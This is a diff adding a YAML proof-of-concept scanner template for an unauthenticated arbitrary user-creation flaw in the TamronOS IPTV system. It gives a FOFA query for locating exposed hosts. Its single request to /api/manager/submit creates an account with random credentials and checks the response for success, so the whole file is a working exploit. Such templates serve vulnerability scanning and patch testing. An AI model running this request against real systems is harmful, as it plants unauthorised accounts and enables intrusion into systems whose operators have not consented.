@@ -1,0 +1,28 @@
+id: poc-yaml-tamronos-iptv-submit-anyuser-register
+info:
+  name: TamronOS IPTV系统 submit 任意用户创建漏洞
+  severity: high
+  tags:
+  - 配置不当
+  finger: tamronos
+  fofa: app="TamronOS-IPTV系统"
+variables:
+  t1: random_str(4)
+  t2: random_str(6)
+requests:
+- method: GET
+  path: /api/manager/submit?group=1&username={{.t1}}&password={{.t2}}
+  expression: 'status_code == 200 &&
+
+    contains(find_json(body,"suc"),"true") &&
+
+    (
+
+    contains(find_json(body,"msg"),"成功") ||
+
+    contains(find_json(body,"msg"),`\u6210\u529f`)
+
+    )
+
+    '
+transport: http
